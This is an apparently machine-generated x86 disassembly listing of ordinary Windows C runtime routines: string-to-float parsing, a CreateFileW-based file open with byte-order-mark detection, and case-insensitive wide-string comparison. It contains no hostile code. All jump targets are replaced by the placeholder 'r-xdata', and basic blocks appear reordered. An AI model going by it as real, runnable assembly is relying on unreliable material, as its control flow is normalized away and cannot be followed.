mov [ ebp - 0x78 ] eax
mov eax [ ebp + 0xc ]
inc esi
xor ecx ecx
push edi
mov [ ebp - 0x70 ] eax
lea edi [ ebp - 0x20 ]
mov [ ebp - 0x74 ] ebx
mov [ ebp - 0x68 ] esi
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x5c ] ebx
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x6c ] ebx
cmp [ ebp + 0x24 ] ebx
jne r-xdata
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x54 ] edx
call sub_10026065
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10020579
add esp 0x14
xor eax eax
jmp r-xdata
inc edx
jmp r-xdata
cmp al 0x9
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10020040
leave
retn
mov al [ edx ]
cmp al 0x20
je r-xdata
cmp al 0xa
je r-xdata
cmp al 0xd
jne r-xdata
mov bl 0x30
cmp ecx 0xa
jne r-xdata
jmp [ ecx * 4 + jump_table_1003512b ]
mov al [ edx ]
inc edx
cmp ecx 0xb
ja r-xdata
jmp r-xdata
mov cl al
sub cl 0x31
cmp cl 0x8
ja r-xdata
mov cl al
sub cl 0x31
mov [ ebp - 0x58 ] esi
cmp cl 0x8
jbe r-xdata
mov cl al
sub cl 0x31
cmp cl 0x8
jbe r-xdata
mov [ ebp - 0x58 ] esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x5c ] esi
jne r-xdata
sub al bl
mov [ ebp - 0x5c ] esi
cmp al 0x9
ja r-xdata
lea ecx [ edx - 0x2 ]
mov [ ebp - 0x54 ] ecx
mov cl al
sub cl 0x31
cmp cl 0x8
ja r-xdata
mov [ ebp - 0x60 ] esi
jmp r-xdata
mov cl al
sub cl 0x31
cmp cl 0x8
jbe r-xdata
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov [ ebp - 0x60 ] esi
xor ecx ecx
jmp r-xdata
cmp [ ebp - 0x58 ] 0x0
mov eax [ ebp - 0x70 ]
mov [ eax ] edx
je r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
push 0x3
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al bl
jge r-xdata
cmp al bl
jge r-xdata
jmp r-xdata
mov edx [ ebp - 0x54 ]
jmp r-xdata
push 0x4
jmp r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x9
jmp r-xdata
cmp al bl
je r-xdata
cmp al bl
jmp r-xdata
push 0xa
pop ecx
dec edx
movsx eax al
sub eax 0x2b
lea ecx [ edx - 0x1 ]
mov [ ebp - 0x54 ] ecx
je r-xdata
cmp al bl
jge r-xdata
mov [ ebp - 0x6c ] 0x4
jmp r-xdata
push 0x18
pop eax
cmp [ ebp - 0x4c ] eax
jbe r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x5
cmp al 0x2b
je r-xdata
push 0x4
jmp r-xdata
cmp al bl
je r-xdata
cmp al 0x39
jg r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
cmp al bl
je r-xdata
pop ecx
dec edx
jmp r-xdata
push 0x7
jmp r-xdata
dec eax
dec eax
je r-xdata
mov al [ edx ]
inc edx
sub al 0x31
cmp al 0x8
jbe r-xdata
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
xor ecx ecx
xor eax eax
xor edx edx
xor esi esi
cmp [ ebp - 0x4c ] 0x0
jbe r-xdata
cmp [ ebp - 0x9 ] 0x5
jl r-xdata
and [ ebp - 0x74 ] 0x0
push 0x2
pop ecx
jmp r-xdata
dec eax
dec eax
je r-xdata
dec edx
push 0xb
jmp r-xdata
cmp al 0x2d
je r-xdata
pop ecx
jmp r-xdata
mov ecx esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
cmp al 0x2b
je r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
dec [ ebp - 0x50 ]
mov al [ edx ]
inc edx
jmp r-xdata
or [ ebp - 0x68 ] 0xffffffff
push 0x7
pop ecx
jmp r-xdata
sub eax 0x3
dec edx
jmp r-xdata
push 0x8
jmp r-xdata
mov edx ecx
mov [ ebp - 0x64 ] ecx
jmp r-xdata
imul ecx ecx 0xa
movsx esi al
lea ecx [ ecx + esi - 0x30 ]
cmp ecx 0x1450
jg r-xdata
jmp r-xdata
dec edi
inc [ ebp - 0x50 ]
mov [ ebp - 0x4c ] eax
inc [ ebp - 0x9 ]
push 0x2
pop ecx
mov [ ebp - 0x74 ] 0x8000
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al bl
je r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
jmp r-xdata
cmp al 0x2d
je r-xdata
mov al [ edx ]
inc edx
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
dec [ ebp - 0x50 ]
cmp al bl
jge r-xdata
mov ecx 0x1451
mov al [ edx ]
inc edx
dec edi
cmp [ edi ] 0x0
je r-xdata
cmp al 0x43
jle r-xdata
mov al [ edx ]
inc edx
jmp r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
dec [ ebp - 0x4c ]
inc [ ebp - 0x50 ]
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x4c ]
lea eax [ ebp - 0x20 ]
push eax
call sub_10036ed2
mov eax [ ebp - 0x64 ]
xor edx edx
add esp 0xc
cmp [ ebp - 0x68 ] edx
jge r-xdata
cmp al 0x45
jle r-xdata
mov al [ edx ]
inc edx
add eax [ ebp - 0x50 ]
cmp [ ebp - 0x60 ] edx
jne r-xdata
neg eax
push 0x6
jmp r-xdata
cmp al 0x63
jle r-xdata
cmp [ ebp - 0x5c ] edx
jne r-xdata
add eax [ ebp + 0x18 ]
cmp al 0x65
jg r-xdata
cmp eax 0x1450
jg r-xdata
sub eax [ ebp + 0x1c ]
xor esi esi
mov eax 0x7fff
mov edx 0x80000000
xor ecx ecx
mov [ ebp - 0x6c ] 0x2
jmp r-xdata
cmp eax 0xffffebb0
jl r-xdata
mov edi [ ebp - 0x78 ]
or eax [ ebp - 0x74 ]
mov [ edi ] cx
mov [ edi + 0xa ] ax
mov eax [ ebp - 0x6c ]
mov [ edi + 0x2 ] esi
mov [ edi + 0x6 ] edx
mov [ ebp - 0x6c ] 0x1
mov ecx rw-data
sub ecx 0x60
mov [ ebp - 0x54 ] eax
cmp eax edx
je r-xdata
mov eax [ ebp - 0x34 ]
movzx ecx [ ebp - 0x3c ]
mov esi [ ebp - 0x3a ]
mov edx [ ebp - 0x36 ]
shr eax 0x10
jmp r-xdata
jge r-xdata
cmp [ ebp + 0x14 ] edx
jne r-xdata
neg eax
mov ecx rw-data
mov [ ebp - 0x54 ] eax
sub ecx 0x60
cmp [ ebp - 0x54 ] edx
je r-xdata
xor eax eax
mov [ ebp - 0x3c ] ax
jmp r-xdata
mov eax [ ebp - 0x54 ]
sar [ ebp - 0x54 ] 0x3
add ecx 0x54
and eax 0x7
mov [ ebp - 0x7c ] ecx
cmp eax edx
je r-xdata
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
imul eax eax 0xc
add eax ecx
mov ebx eax
mov eax 0x8000
cmp [ ebx ] ax
jb r-xdata
mov ecx [ ebp - 0x7c ]
xor edx edx
movzx ecx [ ebx + 0xa ]
xor eax eax
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x32 ]
mov esi ecx
mov edx 0x7fff
xor esi eax
and eax edx
and ecx edx
and esi 0x8000
mov edi 0x7fff
lea edx [ ecx + eax ]
mov [ ebp - 0x70 ] esi
movzx edx dx
cmp ax di
jae r-xdata
mov esi ebx
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x46 ]
lea ebx [ ebp - 0x48 ]
xor eax eax
test si si
sete al
and [ ebp - 0x38 ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x3c ] 0x0
cmp cx di
jae r-xdata
mov edi 0xbffd
cmp dx di
ja r-xdata
mov esi 0x3fbf
cmp dx si
ja r-xdata
xor esi esi
cmp ax si
jne r-xdata
xor eax eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x3c ] eax
jmp r-xdata
cmp cx si
jne r-xdata
inc edx
test [ ebp - 0x34 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x68 ] esi
lea edi [ ebp - 0x28 ]
mov [ ebp - 0x58 ] 0x5
inc edx
test [ ebx + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x38 ] esi
jne r-xdata
inc edi
inc edi
inc [ ebp - 0x68 ]
dec [ ebp - 0x58 ]
cmp [ ebp - 0x58 ] 0x0
jg r-xdata
lea eax [ ebp + eax - 0x3c ]
mov [ ebp - 0x5c ] eax
lea eax [ ebx + 0x8 ]
mov [ ebp - 0x60 ] eax
cmp [ ebx + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x3c ] esi
jne r-xdata
mov eax [ ebp - 0x68 ]
mov ecx [ ebp - 0x58 ]
add eax eax
mov [ ebp - 0x64 ] ecx
test ecx ecx
jle r-xdata
add edx 0xc002
test dx dx
jle r-xdata
mov [ ebp - 0x4c ] 0x1
cmp esi eax
jae r-xdata
cmp [ ebx ] esi
jne r-xdata
xor eax eax
mov [ ebp - 0x32 ] ax
jmp r-xdata
add edx 0xffff
test dx dx
jge r-xdata
mov edi [ ebp - 0x24 ]
test edi edi
js r-xdata
add [ ebp - 0x5c ] 0x2
sub [ ebp - 0x60 ] 0x2
dec [ ebp - 0x64 ]
cmp [ ebp - 0x64 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x4c ] 0x0
mov [ edi - 0x4 ] esi
je r-xdata
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] esi
jmp r-xdata
mov eax 0x8000
mov ecx eax
cmp [ ebp - 0x2c ] cx
ja r-xdata
mov eax edx
neg eax
movzx esi ax
add edx esi
test dx dx
jg r-xdata
mov esi [ ebp - 0x28 ]
mov eax [ ebp - 0x2c ]
shl [ ebp - 0x2c ] 0x1
shr eax 0x1f
mov ecx esi
add esi esi
or esi eax
shr ecx 0x1f
lea eax [ edi + edi ]
or eax ecx
add edx 0xffff
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] eax
test dx dx
jg r-xdata
mov eax [ ebp - 0x60 ]
mov ecx [ ebp - 0x5c ]
movzx ecx [ ecx ]
movzx eax [ eax ]
and [ ebp - 0x4c ] 0x0
imul eax ecx
mov ecx [ edi - 0x4 ]
lea esi [ ecx + eax ]
cmp esi ecx
jb r-xdata
cmp [ ebp - 0x2a ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x2c ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov eax [ ebp - 0x24 ]
mov edi [ ebp - 0x28 ]
mov ecx [ ebp - 0x28 ]
shr [ ebp - 0x24 ] 0x1
shl eax 0x1f
shr edi 0x1
or edi eax
mov eax [ ebp - 0x2c ]
shl ecx 0x1f
shr eax 0x1
or eax ecx
dec esi
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x2c ] eax
jne r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x2a ]
and [ ebp - 0x2a ] 0x0
cmp [ ebp - 0x26 ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp dx ax
jb r-xdata
test [ ebp - 0x2c ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] esi
je r-xdata
mov ax [ ebp - 0x2a ]
or edx [ ebp - 0x70 ]
mov [ ebp - 0x3c ] ax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x3a ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x36 ] eax
mov [ ebp - 0x32 ] dx
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x70 ] ax
mov [ ebp - 0x38 ] eax
sete cl
mov [ ebp - 0x3c ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x34 ] ecx
jmp r-xdata
inc [ ebp - 0x26 ]
jmp r-xdata
and [ ebp - 0x26 ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x22 ] cx
jne r-xdata
or [ ebp - 0x2c ] 0x1
inc [ ebp - 0x22 ]
jmp r-xdata
mov [ ebp - 0x22 ] ax
inc edx
jmp r-xdata
sub_1003515b
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
push ebx
xor ebx ebx
test [ ebp + 0x10 ] 0x80
push esi
push edi
mov esi eax
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x2 ] bl
mov [ ebp - 0x34 ] 0xc
mov [ ebp - 0x30 ] ebx
je r-xdata
mov [ ebp - 0x2c ] 0x1
mov [ ebp - 0x1 ] bl
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x1 ] 0x10
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov eax 0x8000
test eax ecx
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10020451
add esp 0x14
lea eax [ ebp - 0x20 ]
push eax
call sub_10036046
pop ecx
test eax eax
je r-xdata
mov eax ecx
and eax 0x3
sub eax ebx
mov edx 0xc0000000
mov edi 0x80000000
je r-xdata
test ecx 0x74000
jne r-xdata
mov [ ebp - 0x8 ] edi
dec eax
je r-xdata
or [ ebp - 0x1 ] 0x80
cmp [ ebp - 0x20 ] eax
je r-xdata
mov [ ebp - 0x10 ] ebx
sub eax ecx
je r-xdata
test cl 0x8
je r-xdata
dec eax
je r-xdata
cmp eax 0x500
je r-xdata
je r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
sub eax ecx
je r-xdata
mov [ ebp - 0x8 ] 0x40000000
jmp r-xdata
test ecx 0x70000
jne r-xdata
mov [ ebp - 0x8 ] edx
jmp r-xdata
call sub_10026078
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_10026065
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_10020579
add esp 0x14
jmp r-xdata
mov [ ebp - 0x14 ] 0x1
cmp eax 0x600
je r-xdata
mov [ ebp - 0x14 ] 0x3
jmp r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x10 ]
mov edx 0x700
and eax edx
mov ecx 0x400
cmp eax ecx
mov edi 0x100
jg r-xdata
mov [ ebp - 0x10 ] 0x2
jmp r-xdata
sub eax ecx
je r-xdata
mov eax [ ebp + 0x14 ]
push 0x10
pop ecx
sub eax ecx
je r-xdata
mov eax esi
jmp r-xdata
test al 0x40
je r-xdata
mov ecx [ rw-data ]
not ecx
and ecx [ ebp + 0x18 ]
test cl cl
js r-xdata
mov [ ebp - 0x14 ] 0x5
jmp r-xdata
cmp eax edx
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] 0x80
test edi eax
je r-xdata
cmp eax edi
je r-xdata
mov [ ebp - 0x10 ] 0x3
jmp r-xdata
sub eax 0x40
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
test eax 0x1000
je r-xdata
or [ ebp - 0xc ] 0x4000000
or [ ebp - 0x8 ] 0x10000
or [ ebp - 0x10 ] 0x4
mov [ ebp - 0xc ] 0x1
mov [ ebp - 0x14 ] 0x4
jmp r-xdata
cmp eax 0x200
je r-xdata
cmp [ ebp - 0x8 ] edi
sete al
mov [ ebp - 0x10 ] eax
jmp r-xdata
test al 0x20
je r-xdata
or [ ebp - 0xc ] edi
cmp eax 0x300
jne r-xdata
test al 0x10
je r-xdata
or [ ebp - 0xc ] 0x8000000
jmp r-xdata
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
call sub_10033022
mov [ esi ] eax
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0xc ] __dos_header
mov eax [ ebp + 0x8 ]
mov edi [ CreateFileW@IAT ]
push ebx
push [ ebp - 0xc ]
mov [ eax ] 0x1
push [ ebp - 0x14 ]
lea eax [ ebp - 0x34 ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x8 ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x1c ] eax
cmp eax 0xffffffff
jne r-xdata
call sub_10026078
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_10026065
mov [ eax ] 0x18
jmp r-xdata
push [ ebp - 0x1c ]
call [ GetFileType@IAT ]
cmp eax ebx
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov eax 0xc0000000
and ecx eax
cmp ecx eax
jne r-xdata
call sub_10026065
mov eax [ eax ]
jmp r-xdata
cmp eax 0x2
jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
mov esi eax
push esi
call sub_1002608b
pop ecx
push [ ebp - 0x1c ]
call [ CloseHandle@IAT ]
cmp esi ebx
jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
push eax
call sub_1002608b
test [ ebp + 0x10 ] 0x1
je r-xdata
cmp eax 0x3
jne r-xdata
or [ ebp - 0x1 ] 0x40
jmp r-xdata
call sub_10026065
mov [ eax ] 0xd
jmp r-xdata
and [ ebp - 0x8 ] 0x7fffffff
push ebx
push [ ebp - 0xc ]
lea eax [ ebp - 0x34 ]
push [ ebp - 0x14 ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x8 ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x1c ] eax
cmp eax 0xffffffff
jne r-xdata
push [ ebp - 0x1c ]
push [ esi ]
call sub_10032ddd
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
pop ecx
shl eax 0x6
pop ecx
mov cl [ ebp - 0x1 ]
or cl 0x1
mov [ edx + eax + 0x4 ] cl
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
shl eax 0x6
lea eax [ edx + eax + 0x24 ]
and [ eax ] 0x80
mov [ ebp - 0x3 ] cl
and [ ebp - 0x3 ] 0x48
mov [ ebp - 0x1 ] cl
jne r-xdata
or [ ebp - 0x1 ] 0x8
test [ ebp - 0x1 ] 0x80
je r-xdata
test cl 0x80
je r-xdata
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
lea eax [ ecx + eax + 0x24 ]
mov cl [ eax ]
xor cl [ ebp - 0x2 ]
and cl 0x7f
xor [ eax ] cl
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
lea eax [ ecx + eax + 0x24 ]
mov ecx [ ebp + 0x10 ]
mov dl [ eax ]
shr ecx 0x10
shl cl 0x7
and dl 0x7f
or cl dl
mov [ eax ] cl
cmp [ ebp - 0x3 ] bl
jne r-xdata
mov edi 0x74000
mov ecx 0x4000
test [ ebp + 0x10 ] edi
jne r-xdata
test [ ebp + 0x10 ] 0x2
je r-xdata
mov edi [ ebp - 0x8 ]
mov eax 0xc0000000
mov ecx edi
and ecx eax
cmp ecx eax
jne r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
mov eax [ ebp + 0x10 ]
and eax edi
cmp eax ecx
je r-xdata
mov eax [ ebp - 0x20 ]
and eax edi
jne r-xdata
push 0x2
or edi 0xffffffff
push edi
push [ esi ]
call sub_1002b83e
add esp 0xc
mov [ ebp - 0x18 ] eax
cmp eax edi
jne r-xdata
mov eax ebx
test [ ebp + 0x10 ] 0x1
je r-xdata
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
or [ eax ] 0x20
mov [ ebp - 0x2 ] bl
cmp eax 0x10000
je r-xdata
or [ ebp + 0x10 ] eax
or [ ebp + 0x10 ] ecx
jmp r-xdata
push 0x1
lea eax [ ebp - 0x24 ]
push eax
push [ esi ]
mov [ ebp - 0x24 ] ebx
call sub_1002c553
add esp 0xc
test eax eax
jne r-xdata
call sub_10026078
cmp [ eax ] 0x83
je r-xdata
push [ ebp - 0x1c ]
call [ CloseHandle@IAT ]
push ebx
push [ ebp - 0xc ]
lea eax [ ebp - 0x34 ]
push 0x3
push eax
push [ ebp - 0x10 ]
and edi 0x7fffffff
push edi
push [ ebp + 0xc ]
call [ CreateFileW@IAT ]
cmp eax 0xffffffff
jne r-xdata
test [ ebp - 0x1 ] 0x40
mov [ ebp - 0x18 ] ebx
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov eax 0x301
and ecx eax
cmp ecx eax
jne r-xdata
cmp eax 0x14000
je r-xdata
push ebx
push ebx
push [ esi ]
call sub_1002b83e
add esp 0xc
cmp eax edi
je r-xdata
cmp [ ebp - 0x24 ] 0x1a
jne r-xdata
push [ esi ]
call sub_1002c0bf
jmp r-xdata
mov esi [ esi ]
mov ecx esi
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
mov [ esi + ecx ] eax
call [ GetLastError@IAT ]
push eax
call sub_1002608b
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
push [ esi ]
call sub_10032e5e
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ecx 0xc0000000
and eax ecx
cmp eax 0x40000000
je r-xdata
test [ ebp + 0x10 ] 0x70000
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
cmp eax 0x20000
je r-xdata
mov eax [ ebp - 0x18 ]
cdq
push edx
push eax
push [ esi ]
call sub_10035dd4
add esp 0xc
cmp eax edi
je r-xdata
pop ecx
mov eax [ ebp - 0x14 ]
cmp eax ebx
jbe r-xdata
cmp eax 0x80000000
je r-xdata
cmp eax 0x24000
je r-xdata
cmp eax 0x2
jbe r-xdata
push 0x3
lea eax [ ebp - 0x18 ]
push eax
push [ esi ]
call sub_1002c553
add esp 0xc
cmp eax 0xffffffff
je r-xdata
cmp eax ecx
jne r-xdata
cmp eax 0x40000
je r-xdata
movsx eax [ ebp - 0x2 ]
xor edi edi
dec eax
je r-xdata
cmp eax 0x4
ja r-xdata
cmp eax 0x2
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax ebx
jbe r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
cmp eax 0x44000
jne r-xdata
mov [ ebp - 0x18 ] 0xbfbbef
mov [ ebp - 0x14 ] 0x3
dec eax
jne r-xdata
cmp eax 0x5
jne r-xdata
push 0x2
push ebx
push ebx
push [ esi ]
call sub_10031912
add esp 0x10
or eax edx
je r-xdata
mov eax [ ebp - 0x18 ]
and eax 0xffff
cmp eax 0xfffe
jne r-xdata
cmp eax 0x3
jne r-xdata
cmp eax 0x2
jbe r-xdata
add edi eax
cmp [ ebp - 0x14 ] edi
jg r-xdata
mov [ ebp - 0x18 ] 0xfeff
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
push ebx
push ebx
push ebx
push [ esi ]
call sub_10031912
add esp 0x10
and eax edx
cmp eax 0xfeff
jne r-xdata
push [ esi ]
call sub_1002c0bf
pop ecx
call sub_10026065
push 0x16
pop esi
mov [ eax ] esi
push ebx
push ebx
push [ esi ]
call sub_1002b83e
add esp 0xc
jmp r-xdata
cmp [ ebp - 0x18 ] 0xbfbbef
jne r-xdata
cmp eax 0x4
jbe r-xdata
mov eax [ ebp - 0x14 ]
sub eax edi
push eax
lea eax [ ebp + edi - 0x18 ]
push eax
push [ esi ]
call sub_1002b5ee
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
push ebx
push 0x2
push [ esi ]
call sub_1002b83e
add esp 0xc
cmp eax 0xffffffff
je r-xdata
cmp eax 0xffffffff
jne r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
push 0x2
push ebx
push ebx
push [ esi ]
call sub_10031912
add esp 0x10
or eax edx
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
push ebx
push ebx
push ebx
push [ esi ]
call sub_10031912
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
sub_1003587b
push 0x14
push r--data
call sub_10028b48
xor esi esi
mov [ ebp - 0x1c ] esi
xor eax eax
mov edi [ ebp + 0x18 ]
cmp edi esi
setne al
cmp eax esi
jne r-xdata
or [ edi ] 0xffffffff
xor eax eax
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
je r-xdata
call sub_10026065
push 0x16
pop edi
mov [ eax ] edi
push esi
push esi
push esi
push esi
push esi
call sub_10020579
add esp 0x14
mov eax edi
jmp r-xdata
cmp [ ebp + 0x1c ] esi
je r-xdata
call sub_10028b8d
retn
mov [ ebp - 0x4 ] esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_1003515b
add esp 0x14
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10035919
mov eax [ ebp - 0x20 ]
cmp eax esi
je r-xdata
mov eax [ ebp + 0x14 ]
and eax 0xfffffe7f
neg eax
sbb eax eax
inc eax
je r-xdata
or [ edi ] 0xffffffff
sub_10035919
cmp [ ebp - 0x1c ] esi
je r-xdata
retn
cmp [ ebp - 0x20 ] esi
je r-xdata
push [ edi ]
call sub_10032ffb
pop ecx
mov eax [ edi ]
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
mov ecx [ ecx * 4 + rw-data ]
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
sub_10035947
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_1003587b
add esp 0x18
pop ebp
retn
sub_10035967
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
xor esi esi
xor eax eax
push edi
cmp [ ebp + 0x10 ] esi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov ebx [ ebp + 0x8 ]
cmp ebx esi
jne r-xdata
mov edi [ ebp + 0xc ]
cmp edi esi
je r-xdata
call sub_10026065
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_10020579
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_10023358
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] esi
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ ebx ]
push eax
call sub_100370a0
movzx esi ax
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ edi ]
push eax
call sub_100370a0
add esp 0x10
inc ebx
inc ebx
inc edi
inc edi
dec [ ebp + 0x10 ]
movzx eax ax
je r-xdata
movzx eax [ ebx ]
cmp ax 0x41
jb r-xdata
movzx ecx ax
movzx eax si
sub eax ecx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test si si
je r-xdata
movzx esi ax
movzx eax [ edi ]
cmp ax 0x41
jb r-xdata
cmp ax 0x5a
ja r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp si ax
je r-xdata
inc ebx
inc ebx
inc edi
inc edi
dec [ ebp + 0x10 ]
movzx eax ax
je r-xdata
cmp ax 0x5a
ja r-xdata
add eax 0x20
test si si
je r-xdata
add eax 0x20
cmp si ax
je r-xdata
jmp r-xdata
sub_10035a51
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
push edi
cmp [ rw-data ] esi
jne r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10035967
add esp 0x10
xor eax eax
cmp [ ebp + 0x10 ] esi
je r-xdata
pop edi
pop esi
pop ebp
retn
mov edi [ ebp + 0x8 ]
cmp edi esi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx esi
je r-xdata
call sub_10026065
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_10020579
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
movzx eax [ edi ]
cmp ax 0x41
jb r-xdata
movzx ecx ax
movzx eax [ edx ]
